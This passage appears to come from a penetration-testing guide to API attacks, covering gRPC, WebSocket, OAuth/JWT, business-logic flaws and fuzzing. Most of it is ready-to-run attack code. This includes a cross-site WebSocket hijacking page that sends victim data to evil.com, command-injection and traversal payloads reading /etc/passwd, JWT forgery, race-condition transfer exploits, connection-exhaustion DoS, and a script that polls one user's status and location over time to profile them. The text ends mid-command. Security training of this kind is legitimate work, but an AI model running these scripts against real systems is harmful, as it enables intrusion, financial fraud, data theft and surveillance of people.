# List all services
grpcurl -plaintext target.com:50051 list

# Describe a service
grpcurl -plaintext target.com:50051 describe UserService

# Describe a message type
grpcurl -plaintext target.com:50051 describe .user.GetUserRequest

# Call a method with discovered schema
grpcurl -plaintext -d '{"user_id": 1}' target.com:50051 UserService/GetUser
```

**Automated service enumeration:**

```bash
#!/bin/bash
# Enumerate all gRPC services and methods
TARGET="target.com:50051"

echo "[*] Discovering gRPC services..."
services=$(grpcurl -plaintext $TARGET list 2>/dev/null)

if [ -z "$services" ]; then
    echo "[-] Reflection not available or TLS required"
    # Try with TLS
    services=$(grpcurl $TARGET list 2>/dev/null)
fi

for service in $services; do
    echo "[+] Service: $service"
    methods=$(grpcurl -plaintext $TARGET describe $service 2>/dev/null | grep "rpc ")
    echo "    Methods: $methods"
    
    # Try calling each method with empty request
    for method in $(echo "$methods" | awk '{print $2}' | tr -d '('); do
        echo "    [>] Calling $service/$method with empty payload..."
        grpcurl -plaintext -d '{}' $TARGET "$service/$method" 2>&1 | head -5
    done
done
```

### 4.3 TLS Configuration Weaknesses

```bash
# Test gRPC TLS configuration
# Check for plaintext fallback
grpcurl -plaintext target.com:50051 list
# If this works, TLS is not enforced

# Test with invalid certificates
grpcurl -insecure target.com:443 list

# Check supported TLS versions
nmap --script ssl-enum-ciphers -p 443 target.com

# Test certificate validation
grpcurl -cacert /dev/null target.com:443 list
```

### 4.4 Metadata/Header Injection

gRPC metadata is analogous to HTTP headers and can be an injection vector:

```python
import grpc

# Inject metadata headers
metadata = [
    ('authorization', 'Bearer stolen_token'),
    ('x-forwarded-for', '127.0.0.1'),
    ('x-internal-service', 'true'),
    ('x-admin-override', 'true'),
    # CRLF injection attempt
    ('custom-header', 'value\r\nX-Injected: malicious'),
]

channel = grpc.insecure_channel('target.com:50051')
stub = user_pb2_grpc.UserServiceStub(channel)

try:
    response = stub.GetUser(
        user_pb2.GetUserRequest(user_id=1),
        metadata=metadata
    )
    print(f"Response: {response}")
except grpc.RpcError as e:
    print(f"Error: {e.code()} - {e.details()}")
```

```bash
# Using grpcurl for header injection testing
grpcurl -plaintext \
  -H "Authorization: Bearer admin_token" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Internal-Request: true" \
  -d '{"user_id": 1}' \
  target.com:50051 UserService/GetUser
```

### 4.5 Stream Manipulation

gRPC supports four streaming modes: unary, server-streaming, client-streaming, and bidirectional. Each introduces unique attack vectors:

```python
# Client-streaming manipulation — send unexpected number of messages
def malicious_stream():
    """Send an excessive number of stream messages."""
    for i in range(1000000):  # Attempt resource exhaustion
        yield user_pb2.StreamRequest(data=f"payload_{i}" * 1000)

# Out-of-order stream messages
def out_of_order_stream():
    """Send messages in unexpected order to test state handling."""
    yield user_pb2.TransferRequest(step="confirm", amount=1000)  # Skip init
    yield user_pb2.TransferRequest(step="init", to_account="attacker")
    yield user_pb2.TransferRequest(step="execute")

# Stream cancellation attack
async def cancel_after_sensitive_operation():
    """Cancel stream after server has committed but before acknowledgment."""
    async for response in stub.StreamTransfer(request_iterator()):
        if "committed" in str(response):
            raise grpc.RpcError()  # Force cancel
```

### 4.6 Service-to-Service Auth Bypass

In microservice architectures, gRPC services often trust each other implicitly:

```python
# Impersonate an internal service
metadata = [
    ('x-service-name', 'billing-service'),
    ('x-service-version', '2.1.0'),
    ('x-request-id', 'internal-12345'),
]

# Services behind the mesh may not validate caller identity
# Test calling internal-only methods without proper service mesh auth
internal_channel = grpc.insecure_channel('internal-service.cluster.local:50051')
stub = internal_pb2_grpc.InternalServiceStub(internal_channel)
response = stub.AdminOperation(internal_pb2.AdminRequest(), metadata=metadata)
```

### 4.7 Certificate Pinning Testing

```python
import ssl
import grpc

# Test with a different CA
credentials = grpc.ssl_channel_credentials(
    root_certificates=open('attacker_ca.pem', 'rb').read(),
    private_key=open('attacker_key.pem', 'rb').read(),
    certificate_chain=open('attacker_cert.pem', 'rb').read()
)

channel = grpc.secure_channel('target.com:443', credentials)
# If connection succeeds, certificate pinning is not implemented
```

### 4.8 gRPC-Web Specific Vulnerabilities

gRPC-Web is a JavaScript library that enables browser clients to communicate with gRPC services through an Envoy proxy:

```javascript
// gRPC-Web requests can be intercepted and manipulated like HTTP
// The binary protobuf payload is base64-encoded in the request body

// Intercept and decode gRPC-Web traffic
// Content-Type: application/grpc-web+proto
// Body: base64-encoded protobuf

// Manipulation via browser console:
const frame = new Uint8Array([0, 0, 0, 0, 12, 8, 1, 18, 7, 97, 100, 109, 105, 110]);
// First 5 bytes: compression flag (0) + message length (4 bytes big-endian)
// Remaining bytes: protobuf-encoded message
```

**Testing gRPC-Web endpoints:**

```bash
# gRPC-Web endpoints often exposed at different paths
curl -X POST https://target.com/grpc/UserService/GetUser \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" \
  --data-binary @payload.bin

# Test if gRPC-Web proxy exposes methods that should be internal-only
curl -X POST https://target.com/grpc/AdminService/DeleteUser \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" \
  -H "Authorization: Bearer regular_user_token" \
  --data-binary @admin_request.bin
```

---

## 5. WebSocket Security

### 5.1 Origin Validation Bypass

WebSocket upgrade requests include an `Origin` header, but validation is often inadequate:

```python
import websockets
import asyncio

async def test_origin_bypass():
    origins_to_test = [
        "https://evil.com",
        "https://target.com.evil.com",
        "https://subdomain.target.com",
        "null",  # file:// or data: URIs
        "",      # Missing origin
        "https://target.com",  # Legitimate (baseline)
    ]
    
    for origin in origins_to_test:
        try:
            headers = {"Origin": origin} if origin else {}
            async with websockets.connect(
                "wss://api.target.com/ws",
                extra_headers=headers
            ) as ws:
                print(f"[CONNECTED] Origin: {origin or '(missing)'}")
                await ws.send('{"type":"ping"}')
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"  Response: {response[:100]}")
        except Exception as e:
            print(f"[REJECTED] Origin: {origin or '(missing)'} - {e}")
```

### 5.2 Authentication During Upgrade

WebSocket connections are established via HTTP upgrade. Authentication must occur during this handshake or immediately after:

```python
async def test_ws_auth():
    """Test if WebSocket allows unauthenticated access."""
    
    # Test 1: No authentication
    try:
        async with websockets.connect("wss://api.target.com/ws") as ws:
            await ws.send('{"action":"get_user_data","user_id":123}')
            response = await ws.recv()
            print(f"[NO AUTH] Response: {response}")
    except Exception as e:
        print(f"[NO AUTH] Rejected: {e}")
    
    # Test 2: Expired token
    async with websockets.connect(
        "wss://api.target.com/ws",
        extra_headers={"Authorization": "Bearer expired_token_here"}
    ) as ws:
        await ws.send('{"action":"get_user_data","user_id":123}')
        response = await ws.recv()
        print(f"[EXPIRED TOKEN] Response: {response}")
    
    # Test 3: Auth token in URL (common but insecure)
    async with websockets.connect(
        "wss://api.target.com/ws?token=stolen_token"
    ) as ws:
        await ws.send('{"action":"get_user_data","user_id":123}')
        response = await ws.recv()
        print(f"[URL TOKEN] Response: {response}")
```

**Critical issue:** Once authenticated, does the WebSocket connection re-validate the token? If the user's session is revoked, does the WebSocket remain active?

### 5.3 Message Injection

WebSocket messages lack CSRF protection by default because they don't use cookies in the same way:

```python
async def test_message_injection():
    """Test for injection vulnerabilities in WebSocket messages."""
    
    payloads = [
        # SQL injection
        '{"action":"search","query":"admin\' OR 1=1--"}',
        # NoSQL injection
        '{"action":"search","query":{"$ne":null}}',
        # Command injection
        '{"action":"export","filename":"report;cat /etc/passwd"}',
        # XSS (if messages are reflected in web UI)
        '{"action":"chat","message":"<img src=x onerror=alert(1)>"}',
        # Path traversal
        '{"action":"load_file","path":"../../../etc/passwd"}',
        # Template injection
        '{"action":"render","template":"{{7*7}}"}',
        # JSON injection / prototype pollution
        '{"action":"update","data":{"__proto__":{"admin":true}}}',
    ]
    
    async with websockets.connect("wss://api.target.com/ws", extra_headers=auth_headers) as ws:
        for payload in payloads:
            await ws.send(payload)
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=3)
                print(f"Payload: {payload[:50]}... -> Response: {response[:100]}")
            except asyncio.TimeoutError:
                print(f"Payload: {payload[:50]}... -> No response (timeout)")
```

### 5.4 Cross-Site WebSocket Hijacking (CSWSH)

CSWSH exploits the fact that WebSocket upgrade requests include cookies automatically:

```html
<!-- Attacker's page — victim must visit this while authenticated -->
<script>
// The browser sends the victim's cookies with the WebSocket upgrade request
const ws = new WebSocket('wss://api.target.com/ws');

ws.onopen = () => {
    // Authenticated as the victim via their cookies
    ws.send(JSON.stringify({
        action: "get_sensitive_data",
        type: "financial_records"
    }));
};

ws.onmessage = (event) => {
    // Exfiltrate victim's data
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: event.data
    });
};
</script>
```

**Testing CSWSH:**

```python
async def test_cswsh():
    """Verify if WebSocket validates Origin to prevent CSWSH."""
    
    # Simulate cross-origin WebSocket from attacker's site
    # Browser would include victim's cookies automatically
    async with websockets.connect(
        "wss://api.target.com/ws",
        extra_headers={
            "Origin": "https://evil.com",
            "Cookie": "session=victim_session_cookie"
        }
    ) as ws:
        await ws.send('{"action":"transfer","to":"attacker","amount":10000}')
        response = await ws.recv()
        if "error" not in response.lower():
            print("[CSWSH CONFIRMED] Action executed with cross-origin request")
```

### 5.5 State Manipulation Through Out-of-Order Messages

WebSocket connections are stateful. Sending messages in unexpected order can bypass workflow validation:

```python
async def test_state_manipulation():
    """Test if the server enforces correct message ordering."""
    
    async with websockets.connect("wss://api.target.com/ws", extra_headers=auth_headers) as ws:
        # Normal flow: init -> configure -> confirm -> execute
        # Attack: skip directly to execute
        
        # Skip initialization
        await ws.send('{"step":"execute","transfer_id":"12345","amount":10000}')
        r1 = await ws.recv()
        print(f"Skip to execute: {r1}")
        
        # Replay a previous confirmation
        await ws.send('{"step":"confirm","transfer_id":"12345","otp":"123456"}')
        await ws.send('{"step":"confirm","transfer_id":"12345","otp":"123456"}')  # Double-spend
        r2 = await ws.recv()
        print(f"Double confirm: {r2}")
        
        # Send conflicting state
        await ws.send('{"step":"init","amount":1}')
        await ws.send('{"step":"confirm","amount":10000}')  # Different amount
        r3 = await ws.recv()
        print(f"Conflicting state: {r3}")
```

### 5.6 DoS Through Connection Exhaustion

```python
import asyncio
import websockets

async def connection_exhaustion():
    """Open maximum number of WebSocket connections to exhaust server resources."""
    connections = []
    
    for i in range(10000):
        try:
            ws = await websockets.connect("wss://api.target.com/ws")
            connections.append(ws)
            if i % 100 == 0:
                print(f"[+] {i} connections established")
        except Exception as e:
            print(f"[!] Failed at connection {i}: {e}")
            break
    
    print(f"[*] Total connections: {len(connections)}")
    # Keep connections alive
    while True:
        for ws in connections:
            try:
                await ws.ping()
            except:
                pass
        await asyncio.sleep(30)

# Slowloris-style: open connections, send data very slowly
async def slow_ws_dos():
    """Maintain connections while sending data at minimum rate."""
    async with websockets.connect("wss://api.target.com/ws") as ws:
        while True:
            await ws.send("a")  # Minimal data to keep connection alive
            await asyncio.sleep(29)  # Just under typical timeout
```

### 5.7 Proxy/WAF Bypass Through WebSocket Tunneling

WebSocket connections can tunnel arbitrary traffic past security controls:

```python
# Many WAFs don't inspect WebSocket frames after the upgrade handshake
# Tunnel HTTP requests through WebSocket to bypass WAF rules

async def tunnel_through_websocket():
    """Use WebSocket as a tunnel to bypass WAF inspection."""
    
    async with websockets.connect("wss://api.target.com/ws") as ws:
        # If the WebSocket handler processes HTTP-like commands
        # Some implementations parse JSON actions that map to HTTP endpoints
        
        # Bypass WAF SQL injection rules
        # WAF inspects HTTP but not WebSocket frames
        await ws.send(json.dumps({
            "action": "query",
            "sql": "SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin_users--"
        }))
        
        response = await ws.recv()
        print(f"Tunneled response: {response}")
```

**WebSocket upgrade smuggling:**

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# After upgrade, the connection bypasses HTTP-layer security controls
# WAF, API gateway rate limiting, and request logging may not cover WS frames
```

---

## 6. API Authentication Attacks

### 6.1 OAuth 2.0 Exploits

#### Authorization Code Interception

```python
# Intercept authorization code through open redirect
# If redirect_uri validation is loose:
malicious_redirect = "https://legitimate.com/callback/../../../attacker.com/steal"

auth_url = (
    "https://auth.target.com/authorize?"
    "response_type=code&"
    "client_id=legitimate_client&"
    f"redirect_uri={malicious_redirect}&"
    "scope=openid+profile+email&"
    "state=random123"
)
print(f"Phishing URL: {auth_url}")
# Victim clicks -> authenticates -> code sent to attacker
```

#### Redirect URI Manipulation

```python
# Test redirect_uri validation bypass techniques
bypass_uris = [
    "https://legitimate.com/callback",               # Baseline (should work)
    "https://legitimate.com/callback/../../evil.com", # Path traversal
    "https://legitimate.com/callback@evil.com",       # URL parsing confusion
    "https://legitimate.com/callback#@evil.com",      # Fragment confusion
    "https://legitimate.com/callback%0d%0a",          # CRLF
    "https://legitimate.com/callback/../",            # Directory traversal
    "https://sub.legitimate.com.evil.com/callback",   # Subdomain spoof
    "https://legitimate.com/callback?next=evil.com",  # Open redirect chain
    "http://legitimate.com/callback",                 # HTTP downgrade
    "https://legitimate.com/callback/..;/",           # Semicolon path traversal
]

for uri in bypass_uris:
    r = httpx.get("https://auth.target.com/authorize", params={
        "response_type": "code",
        "client_id": "app_id",
        "redirect_uri": uri,
        "scope": "openid",
        "state": "test"
    }, follow_redirects=False)
    if r.status_code in (301, 302, 303):
        location = r.headers.get("Location", "")
        print(f"[{r.status_code}] {uri[:50]} -> {location[:80]}")
```

#### Scope Escalation

```python
# Test if token endpoint grants more scopes than authorized
scopes_to_test = [
    "openid profile email",              # Standard
    "openid profile email admin",         # Inject admin scope
    "openid profile email write:users",   # Inject write scope
    "openid profile email *",             # Wildcard
    "openid profile email ../*",          # Traversal in scope
]

# After obtaining authorization code with limited scope,
# request token with escalated scope
for scope in scopes_to_test:
    r = httpx.post("https://auth.target.com/oauth/token", data={
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": redirect_uri,
        "client_id": client_id,
        "scope": scope
    })
    token_data = r.json()
    granted_scope = token_data.get("scope", "")
    print(f"Requested: {scope}")
    print(f"Granted:   {granted_scope}")
    print(f"Match:     {'ESCALATED' if 'admin' in granted_scope else 'OK'}")
```

#### Token Theft via Referrer Leakage

If the OAuth redirect page contains external links, the authorization code can leak via the `Referer` header:

```http
# After redirect to: https://app.com/callback?code=SECRET_AUTH_CODE
# If the callback page loads external resources:
# GET https://analytics.thirdparty.com/track.js HTTP/1.1
# Referer: https://app.com/callback?code=SECRET_AUTH_CODE
```

### 6.2 JWT Attacks

#### Algorithm Switching (Algorithm Confusion)

```python
import jwt
import json
import base64

# Attack: Switch from RS256 to HS256
# The server's RSA public key is used as the HMAC secret

# 1. Obtain the server's public key (often exposed at /.well-known/jwks.json)
jwks = httpx.get("https://auth.target.com/.well-known/jwks.json").json()
public_key_pem = jwk_to_pem(jwks["keys"][0])  # Convert JWK to PEM

# 2. Sign a forged token using the public key as HMAC secret
forged_payload = {
    "sub": "admin",
    "role": "superuser",
    "exp": 9999999999
}

# Using PyJWT with algorithm confusion
forged_token = jwt.encode(
    forged_payload,
    public_key_pem,  # Public key used as HMAC secret
    algorithm="HS256"
)

# 3. Send forged token
r = httpx.get("https://api.target.com/v1/admin/users",
              headers={"Authorization": f"Bearer {forged_token}"})
print(r.status_code, r.text[:200])
```

#### Key Confusion Attack

When the server accepts both RSA and HMAC algorithms, the RSA public key (which is public) can be used as the HMAC secret:

```python
# Detailed key confusion exploitation
import hmac
import hashlib

def forge_jwt_key_confusion(public_key_bytes: bytes, payload: dict) -> str:
    """Forge JWT using RSA public key as HMAC secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).rstrip(b'=').decode()
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    
    signing_input = f"{header_b64}.{payload_b64}".encode()
    
    signature = hmac.new(
        public_key_bytes,
        signing_input,
        hashlib.sha256
    ).digest()
    
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    
    return f"{header_b64}.{payload_b64}.{sig_b64}"
```

#### Claim Injection

```python
# Modify JWT claims to escalate privileges
import jwt

# Decode without verification to inspect structure
token = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature"
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"Original claims: {decoded}")

# Common claim injections:
injections = [
    {"sub": "admin", "role": "superuser"},
    {"sub": "user123", "role": "admin", "permissions": ["*"]},
    {"sub": "user123", "tenant_id": "competitor_tenant"},
    {"sub": "user123", "exp": 9999999999},  # Never expires
    {"sub": "user123", "iss": "https://trusted-issuer.com"},
]
```

#### JKU (JWK Set URL) Header Injection

```python
# JKU header tells the server where to fetch the verification key
# If the server trusts arbitrary JKU URLs, attacker can host their own keys

# 1. Generate attacker's key pair
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 2. Host the public key as JWKS at attacker-controlled URL
attacker_jwks = {
    "keys": [{
        "kty": "RSA",
        "n": base64url_encode(public_key.public_numbers().n),
        "e": base64url_encode(public_key.public_numbers().e),
        "kid": "attacker-key-1"
    }]
}
# Host at: https://evil.com/.well-known/jwks.json

# 3. Create JWT with JKU pointing to attacker's JWKS
forged_header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://evil.com/.well-known/jwks.json",
    "kid": "attacker-key-1"
}

forged_token = jwt.encode(
    {"sub": "admin", "role": "superuser"},
    private_key,
    algorithm="RS256",
    headers=forged_header
)
```

#### X5U Header Injection

Similar to JKU but using X.509 certificate chains:

```python
# x5u header points to an X.509 certificate chain
# If server trusts arbitrary x5u URLs:

forged_header = {
    "alg": "RS256",
    "x5u": "https://evil.com/cert.pem"  # Attacker's certificate
}

# Server fetches attacker's cert and uses it to verify the signature
# Attacker signs with their private key — verification passes
```

### 6.3 API Key Extraction

**From mobile applications:**

```bash
# Android APK decompilation
apktool d target.apk -o decompiled/
grep -rn "api[_-]key\|apikey\|api_secret\|x-api-key" decompiled/
strings decompiled/classes.dex | grep -i "key\|secret\|token"

# iOS IPA analysis
unzip target.ipa -d extracted/
strings extracted/Payload/App.app/App | grep -i "api\|key\|secret"
```

**From JavaScript:**

```bash
# Extract API keys from webpack bundles
curl -s https://target.com/static/js/main.chunk.js | \
  grep -oP '(?:api_key|apiKey|API_KEY|x-api-key)["\s:=]+["\s]*([a-zA-Z0-9_\-]+)' 

# Search source maps (if exposed)
curl -s https://target.com/static/js/main.chunk.js.map | \
  python -c "import json,sys;d=json.load(sys.stdin);[print(s) for s in d.get('sources',[])]"
```

**From git repositories:**

```bash
# Using trufflehog for git history scanning
trufflehog git file://./target-repo --only-verified

# Using gitleaks
gitleaks detect --source=./target-repo --report-format=json --report-path=leaks.json

# Manual git history search
git log --all -p | grep -B5 -A5 "api[_-]key\|secret\|token\|password"
```

### 6.4 HMAC Timing Attacks

When HMAC verification uses non-constant-time comparison, response time differences reveal the correct signature byte-by-byte:

```python
import time
import statistics
import httpx

def timing_attack_hmac(url: str, message: str, signature_length: int = 32):
    """
    Exploit non-constant-time HMAC comparison.
    Each byte that matches adds measurable delay.
    """
    known_bytes = bytearray()
    
    for position in range(signature_length):
        timings = {byte_val: [] for byte_val in range(256)}
        
        for _ in range(50):  # Multiple samples for statistical significance
            for byte_val in range(256):
                test_sig = bytes(known_bytes) + bytes([byte_val]) + b'\x00' * (signature_length - position - 1)
                
                start = time.perf_counter_ns()
                httpx.post(url, headers={
                    "X-Signature": test_sig.hex(),
                    "X-Timestamp": str(int(time.time())),
                }, content=message.encode())
                elapsed = time.perf_counter_ns() - start
                
                timings[byte_val].append(elapsed)
        
        # Statistical analysis: byte with highest median response time
        medians = {k: statistics.median(v) for k, v in timings.items()}
        best_byte = max(medians, key=medians.get)
        known_bytes.append(best_byte)
        print(f"Position {position}: 0x{best_byte:02x} (median: {medians[best_byte]:.0f}ns)")
    
    return bytes(known_bytes)
```

---

## 7. Business Logic in APIs

### 7.1 IDOR Exploitation Chains

Simple IDOR becomes devastating when chained across multiple endpoints:

```python
# Chain: Enumerate users -> Access their documents -> Download sensitive files

# Step 1: Enumerate user IDs through a leaky endpoint
user_ids = []
r = httpx.get("https://api.target.com/v1/directory?page=1&limit=100", headers=auth)
for user in r.json()["users"]:
    user_ids.append(user["id"])

# Step 2: Access each user's documents
for uid in user_ids:
    docs = httpx.get(f"https://api.target.com/v1/users/{uid}/documents", headers=auth)
    if docs.status_code == 200:
        for doc in docs.json()["documents"]:
            # Step 3: Download sensitive documents
            file_r = httpx.get(
                f"https://api.target.com/v1/documents/{doc['id']}/download",
                headers=auth
            )
            if file_r.status_code == 200:
                print(f"[IDOR CHAIN] User {uid} -> Doc: {doc['name']} ({len(file_r.content)} bytes)")
```

### 7.2 Price Manipulation in E-Commerce APIs

```python
# Test price manipulation vectors

# 1. Client-side price passed to server
r = httpx.post("https://api.target.com/v1/checkout", headers=auth, json={
    "items": [{"product_id": 1, "quantity": 1, "price": 0.01}],  # Manipulated price
    "payment_method": "card_123"
})

# 2. Currency confusion
r = httpx.post("https://api.target.com/v1/checkout", headers=auth, json={
    "items": [{"product_id": 1, "quantity": 1}],
    "currency": "VND",  # Vietnamese Dong (1 USD ≈ 25,000 VND)
    "total": 100  # Interpreted as 100 VND instead of 100 USD?
})

# 3. Negative quantity / negative price
r = httpx.post("https://api.target.com/v1/cart/add", headers=auth, json={
    "product_id": 1,
    "quantity": -1  # Negative = refund?
})

# 4. Discount code stacking
r = httpx.post("https://api.target.com/v1/cart/apply-discount", headers=auth, json={
    "codes": ["SAVE10", "SAVE10", "SAVE10", "SAVE10", "SAVE10"]  # Apply 5x
})

# 5. Race condition on discount application (see 7.3)
```

### 7.3 Race Conditions in Financial APIs

```python
import asyncio
import httpx

async def race_condition_transfer():
    """
    Exploit TOCTOU (Time-of-Check-to-Time-of-Use) race condition.
    Account balance: $100
    Send 50 concurrent transfers of $100 each.
    If balance check is not atomic with deduction, some may succeed.
    """
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(50):
            task = client.post(
                "https://api.target.com/v1/transfer",
                headers=auth,
                json={"to": "attacker_account", "amount": 100}
            )
            tasks.append(task)
        
        # Fire all requests simultaneously
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful = sum(1 for r in responses 
                        if not isinstance(r, Exception) and r.status_code == 200)
        print(f"[RACE] {successful}/{len(tasks)} transfers succeeded")
        print(f"[RACE] Potential gain: ${successful * 100} from $100 balance")

# Coupon race condition — redeem one-time coupon multiple times
async def race_condition_coupon():
    async with httpx.AsyncClient() as client:
        tasks = [
            client.post("https://api.target.com/v1/coupons/redeem",
                       headers=auth, json={"code": "ONETIMEONLY50"})
            for _ in range(20)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        redeemed = [r for r in responses 
                   if not isinstance(r, Exception) and r.status_code == 200]
        print(f"[RACE] Coupon redeemed {len(redeemed)} times (should be 1)")
```

### 7.4 Workflow Bypass Through API Direct Calls

```python
# Normal workflow: Search -> View -> Add to Cart -> Checkout -> Pay -> Confirm
# Attack: Skip steps by calling APIs directly

# Skip payment step — go directly to order confirmation
r = httpx.post("https://api.target.com/v1/orders/confirm", headers=auth, json={
    "cart_id": "cart_123",
    "payment_status": "completed",  # Self-reported payment status
    "transaction_id": "fake_txn_001"
})

# Skip verification — access verified-only features
r = httpx.post("https://api.target.com/v1/users/me/verify", headers=auth, json={
    "verification_status": "approved",
    "verified_at": "2024-01-01T00:00:00Z"
})

# Skip approval workflow
r = httpx.put("https://api.target.com/v1/expense-reports/123/status", headers=auth, json={
    "status": "approved",
    "approver_id": 1  # Self-approve
})
```

### 7.5 Data Aggregation Attacks

Individual API calls return limited data, but aggregating across many calls reveals sensitive patterns:

```python
# Aggregate user presence data to build a surveillance profile
import time

target_user_id = 42
activity_log = []

while True:
    r = httpx.get(f"https://api.target.com/v1/users/{target_user_id}/status", headers=auth)
    status = r.json()
    activity_log.append({
        "timestamp": time.time(),
        "online": status.get("is_online"),
        "last_active": status.get("last_active"),
        "location": status.get("approximate_location")
    })
    time.sleep(60)  # Poll every minute

# Over time, this reveals: work hours, sleep patterns, travel schedules
```

### 7.6 Pagination Exploitation

```python
# 1. Negative offset to access internal records
r = httpx.get("https://api.target.com/v1/records?offset=-100&limit=100", headers=auth)

# 2. Extremely large limit to dump entire database
r = httpx.get("https://api.target.com/v1/records?offset=0&limit=999999999", headers=auth)

# 3. Integer overflow on offset
r = httpx.get("https://api.target.com/v1/records?offset=2147483648&limit=10", headers=auth)

# 4. Type confusion on pagination
r = httpx.get("https://api.target.com/v1/records?offset=0&limit[]=10", headers=auth)

# 5. Cursor manipulation (for cursor-based pagination)
# Cursors are often base64-encoded JSON — decode, modify, re-encode
import base64
cursor = "eyJpZCI6MTAwLCJ0ZW5hbnQiOiJteV90ZW5hbnQifQ=="
decoded = json.loads(base64.b64decode(cursor))
# {"id": 100, "tenant": "my_tenant"}
decoded["tenant"] = "competitor_tenant"
forged_cursor = base64.b64encode(json.dumps(decoded).encode()).decode()
r = httpx.get(f"https://api.target.com/v1/records?cursor={forged_cursor}", headers=auth)
```

### 7.7 Batch Endpoint Abuse

```python
# Batch endpoints process multiple operations in a single request
# They often have weaker per-operation validation

# 1. Batch BOLA — access multiple users' data in one request
r = httpx.post("https://api.target.com/v1/batch", headers=auth, json={
    "operations": [
        {"method": "GET", "path": "/users/1/profile"},
        {"method": "GET", "path": "/users/2/profile"},
        {"method": "GET", "path": "/users/3/profile"},
        # ... up to hundreds of users
    ]
})

# 2. Batch privilege escalation — mix authorized and unauthorized ops
r = httpx.post("https://api.target.com/v1/batch", headers=auth, json={
    "operations": [
        {"method": "GET", "path": "/users/me"},  # Authorized (establishes context)
        {"method": "DELETE", "path": "/admin/users/victim"},  # Unauthorized
    ]
})

# 3. Batch rate limit bypass
# Individual endpoint: 100 req/min
# Batch endpoint: 1 req containing 1000 operations
```

---

## 8. API Fuzzing and Automation

### 8.1 Property-Based Testing for APIs

Property-based testing generates random inputs guided by the API schema to discover edge cases:

```python
from hypothesis import given, strategies as st, settings
import httpx

# Define strategies based on API schema
user_payload = st.fixed_dictionaries({
    "name": st.text(min_size=0, max_size=1000),
    "email": st.emails(),
    "age": st.integers(min_value=-2**31, max_value=2**31),
    "role": st.sampled_from(["user", "admin", "moderator", "", None, "../../admin"]),
    "metadata": st.dictionaries(
        keys=st.text(max_size=50),
        values=st.text(max_size=200),
        max_size=100
    )
})

@given(payload=user_payload)
@settings(max_examples=1000)
def test_create_user_api(payload):
    """Property: API should never return 500 for any valid-typed input."""
    r = httpx.post("https://api.target.com/v1/users",
                   json=payload, headers=auth, timeout=10)
    
    # Properties that should always hold:
    assert r.status_code != 500, f"Server error with payload: {payload}"
    assert r.status_code != 503, f"Service unavailable with payload: {payload}"
    assert "stack trace" not in r.text.lower(), f"Stack trace leaked: {r.text[:200]}"
    assert "password" not in r.text.lower() or r.status_code == 200, \
        f"Password in error response: {r.text[:200]}"
```

### 8.2 Schemathesis — Schema-Based Fuzzing

Schemathesis generates test cases from OpenAPI/GraphQL schemas:

```bash
# Install
pip install schemathesis

# Run against OpenAPI spec
schemathesis run https://api.target.com/openapi.json \
  --base-url https://api.target.com \
  --header "Authorization: Bearer $TOKEN" \
  --hypothesis-max-examples=500 \
  --checks all \
  --stateful=links

# Run with custom checks
schemathesis run https://api.target.com/openapi.json \
  --validate-schema=true \
  --hypothesis-seed=42 \
  --report

# GraphQL fuzzing
schemathesis run https://api.target.com/graphql \
  --header "Authorization: Bearer $TOKEN" \
  --hypothesis-max-examples=200
```

**Custom Schemathesis checks:**

```python
import schemathesis

schema = schemathesis.from_url("https://api.target.com/openapi.json")

@schema.parametrize()
def test_api_security(case):
    response = case.call()
    
    # Custom security checks
    assert response.status_code != 500
    assert "server" not in response.headers  # Info disclosure
    assert "x-powered-by" not in response.headers
    
    # Check for sensitive data in error responses
    if response.status_code >= 400:
        body = response.text.lower()
        assert "stack" not in body
        assert "traceback" not in body
        assert "password" not in body
        assert "secret" not in body
```

### 8.3 RESTler — Stateful REST API Fuzzing

RESTler (Microsoft Research) maintains state across requests, testing API operation sequences:

```bash
# Compile the API spec
restler compile --api_spec openapi.json

# Run in fuzz-lean mode (quick)
restler fuzz-lean --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --settings Compile/engine_settings.json \
  --token_refresh_interval 300 \
  --token_refresh_command "python get_token.py"

# Run full fuzzing
restler fuzz --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --time_budget 3600 \
  --settings Compile/engine_settings.json
```

**RESTler configuration for auth:**

```json
{
  "authentication": {
    "token": {
      "location": "Header",
      "token_refresh_cmd": "python3 /path/to/refresh_token.py",
      "token_refresh_interval": 300
    }
  },
  "per_resource_settings": {
    "/admin/*": {
      "producer_timing_delay": 5,
      "custom_dictionary": {
        "restler_custom_payload": {
          "role": ["admin", "superuser"]
        }
      }
    }
  }
}
```

### 8.4 API Fuzzing with Burp Suite / OWASP ZAP

**Burp Suite extensions for API testing:**

- **InQL** — GraphQL introspection and query generation.
- **JSON Web Token Attacker** — Automated JWT attack suite.
- **Autorize** — Automated authorization testing (replay requests with different auth tokens).
- **Param Miner** — Discover hidden parameters.
- **Upload Scanner** — Test file upload endpoints.
- **Turbo Intruder** — High-speed fuzzing for race conditions.
- **Flow** — Visualize multi-step API workflows.

**OWASP ZAP API scanning:**

```bash
# Import OpenAPI spec and scan
zap-cli quick-scan -s all -r report.html \
  --api-key $ZAP_API_KEY \
